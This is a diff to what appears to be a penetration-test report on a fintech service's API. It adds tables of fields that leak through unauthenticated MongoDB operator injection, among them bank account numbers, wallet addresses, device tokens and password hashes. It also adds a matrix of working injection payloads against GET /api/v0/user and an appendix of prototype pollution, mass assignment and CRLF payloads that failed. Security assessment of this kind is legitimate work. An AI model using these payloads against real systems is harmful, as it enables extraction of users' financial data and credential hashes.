@@ -569,7 +569,12 @@ GET /api/v0/user?username=bitwatch&liveSecret[$regex]=^. -> MATCH (secret exists
 | netbankAccountNumber | YES | YES | Linked bank account number |
 | pin | YES | YES | Bcrypt PIN hash (4-6 digits = trivial crack) |
 | banned | YES | N/A (filter) | Status enumeration |
-| deviceToken | NO | NO | Protected |
+| deviceToken | YES | YES | Push notification token (Firebase FCM) |
+| onChainReceivingWallet.address | YES | YES | BTC wallet address extraction |
+| sweepConfig.accountNumber | YES | YES | Auto-withdrawal bank account |
+| sweepConfig.bankCode | YES | YES | Auto-withdrawal bank code |
+| riskScore | YES | Via $gt/$lt binary search | Internal risk scoring data |
+| createdAt | YES | Via $gt/$lt binary search | Account creation timestamp |
 | identityDocument.* | NO | NO | Protected |
 | personalInformation.* | NO | NO | Protected |
 
@@ -605,3 +610,137 @@ No authentication. Credential theft (API keys) + PII exposure + enables complete
 
 **UNTESTED (Server-side auth blocks testing):**
 - CHAIN 3, 4, 5, 6 - Require admin credentials or more complex setup to test.
+
+---
+
+## APPENDIX A: Complete MongoDB Operator Test Matrix
+
+Tested all MongoDB query and update operators against `GET /api/v0/user` (NO AUTH).
+
+### Query Operators -- WORKING (return user data)
+
+| Operator | Syntax | Result | Notes |
+|----------|--------|--------|-------|
+| `$regex` | `password[$regex]=^\$2a` | MATCH + full user object | Primary extraction vector |
+| `$gt` | `balances.PHP[$gt]=1000` | MATCH + full user object | Binary search for numerics |
+| `$gte` | `balances.PHP[$gte]=1000` | MATCH + full user object | Same as $gt |
+| `$lt` | `balances.PHP[$lt]=99999` | MATCH + stripped user object | Fewer fields in response |
+| `$lte` | `balances.PHP[$lte]=99999` | MATCH + stripped user object | Fewer fields in response |
+| `$eq` | `username[$eq]=admin` | MATCH + full user object | Explicit equality |
+| `$ne` | `username[$ne]=nonexistent` | MATCH (first user) | Enumeration via negation |
+| `$in` | `username[$in][]=admin` | MATCH + full user object | Array membership |
+| `$nin` | `username[$nin][]=nonexistent` | MATCH (first user) | Inverse array membership |
+| `$not` | `username[$not][$regex]=zzz` | MATCH (first non-matching) | Negation wrapper |
+| `$nor` | Nested array syntax | MATCH | Complex negation |
+| `$exists` | `phone[$exists]=true` | MATCH if field exists | Field presence check |
+| `$mod` | `balances.PHP[$mod][]=100&[$mod][]=0` | MATCH for divisible values | Modulo filter |
+| `$size` | Used on array fields | MATCH | Array length filter |
+| `$all` | Used on array fields | MATCH | All elements present |
+| `$options` | `password[$regex]=hash&password[$options]=i` | MATCH with case-insensitive | Regex modifier |
+| `$comment` | `username[$comment]=test&username=admin` | MATCH (ignored by query) | No-op, passes through |
+
+### Query Operators -- PARTIALLY WORKING
+
+| Operator | Syntax | Result | Notes |
+|----------|--------|--------|-------|
+| `$elemMatch` | On array fields | MATCH but stripped response | Fewer fields returned |
+
+### Query Operators -- NOT WORKING
+
+| Operator | Syntax | Result | Notes |
+|----------|--------|--------|-------|
+| `$where` | `$where=function(){return true}` | `{"user":null}` | Server-side JS execution disabled |
+| `$type` | `username[$type]=2` | Empty response / 500 crash | Crashes the server |
+| `$text` | `$text[$search]=admin` | `{"user":null}` | No text index configured |
+| `$or` / `$and` | Top-level array syntax via qs | `{"user":null}` | qs parser can't build top-level $or/$and |
+| `$expr` | `$expr[$eq][]=...` | `{"user":null}` | Aggregation operator, not supported in find |
+| `$bitsAllSet` | `field[$bitsAllSet]=1` | `{"user":null}` | Not applicable to string fields |
+| `$jsonSchema` | Complex nested syntax | `{"user":null}` | Schema validation operator |
+
+### Update/Write Operators -- ALL INEFFECTIVE
+
+Tested on writable endpoints (change-password, sweep-config, merchant-cashback).
+All return 200 OK but NO data modification occurs. Server uses explicit field destructuring
+from request body, not raw MongoDB `$set`/`$inc` merge.
+
+| Operator | Target | Result |
+|----------|--------|--------|
+| `$set` | `role[$set]=admin` | 200 OK, role unchanged |
+| `$unset` | `role[$unset]=1` | 200 OK, role unchanged |
+| `$inc` | `balances.PHP[$inc]=999` | 200 OK, balance unchanged |
+| `$mul` | `balances.PHP[$mul]=100` | 200 OK, balance unchanged |
+| `$push` | `role[$push]=admin` | 200 OK, role unchanged |
+| `$rename` | `role[$rename]=newRole` | 200 OK, no field change |
+
+---
+
+## APPENDIX B: Prototype Pollution & Server-Side PP Testing -- DISPROVEN
+
+Comprehensive testing of Prototype Pollution (PP) and Server-Side Prototype Pollution (SSPP)
+from all angles. None were effective.
+
+### Query Parameter PP (Cloudflare WAF blocks)
+
+| Payload | Result |
+|---------|--------|
+| `__proto__[role]=admin` | Cloudflare WAF block page |
+| `constructor[prototype][role]=admin` | Cloudflare WAF block page |
+| `__proto__[isAdmin]=true` | Cloudflare WAF block page |
+| Double-encoded: `__%70roto__[role]=admin` | WAF block |
+| Unicode: `__proto__` | WAF block |
+
+### JSON Body PP
+
+| Endpoint | Payload | Result |
+|----------|---------|--------|
+| POST /api/v0/auth (login) | `{"username":"test","password":"test","__proto__":{"role":"admin"}}` | 200 OK, role=user (no pollution) |
+| POST /api/v0/auth (login) | `{"username":"test","password":"test","constructor":{"prototype":{"role":"admin"}}}` | HTTP 000 (connection crash) |
+| PUT /api/v0/user (profile) | `{"__proto__":{"role":"admin"}}` | 400 Bad Request (schema validation) |
+| Various PUT endpoints | `{"__proto__":{"isAdmin":true}}` | Either 400 or accepted with no effect |
+
+### Mass Assignment Testing
+
+| Endpoint | Extra Field | Result |
+|----------|-------------|--------|
+| PUT /api/v0/user | `role: "admin"` | 200 OK, role unchanged (server strips) |
+| PUT /api/v0/user | `isAdmin: true` | 200 OK, no isAdmin field created |
+| PUT /api/v0/user | `banned: false` | 200 OK, banned status unchanged |
+| PUT /api/v0/user | `balances: {PHP: 999999}` | 200 OK, balance unchanged |
+| POST /api/v0/auth | `role: "admin"` in login body | 200 OK, role from DB not request |
+
+### HTTP Method Override
+
+| Header/Param | Result |
+|--------------|--------|
+| `X-HTTP-Method-Override: PUT` on GET | 404 (not supported) |
+| `_method=PUT` query param | 404 (not supported) |
+| `X-HTTP-Method-Override: DELETE` | 404 (not supported) |
+
+### Content-Type Manipulation
+
+| Content-Type | Result |
+|-------------|--------|
+| `application/x-www-form-urlencoded` | Parsed but same behavior |
+| `multipart/form-data` | Parsed but same behavior |
+| `text/plain` | Body ignored |
+
+### HTTP Parameter Pollution (HPP)
+
+| Payload | Result |
+|---------|--------|
+| `role=user&role=admin` (duplicate params) | Server takes first value |
+| `username=test&username[$ne]=x` (mixed) | Server uses explicit param |
+
+### CRLF Injection
+
+| Payload | Result |
+|---------|--------|
+| `%0d%0aX-Injected:true` in params | WAF blocks or stripped |
+
+### Conclusion
+Server-side defenses are solid against PP/SSPP/mass assignment:
+- Cloudflare WAF blocks `__proto__` and `constructor.prototype` in query strings
+- Express body parser accepts `__proto__` in JSON but V8 does not pollute Object.prototype via JSON.parse
+- Server reads role/permissions from database, not request object prototype chain
+- Explicit field destructuring on all write endpoints prevents mass assignment
+- HTTP method override not enabled
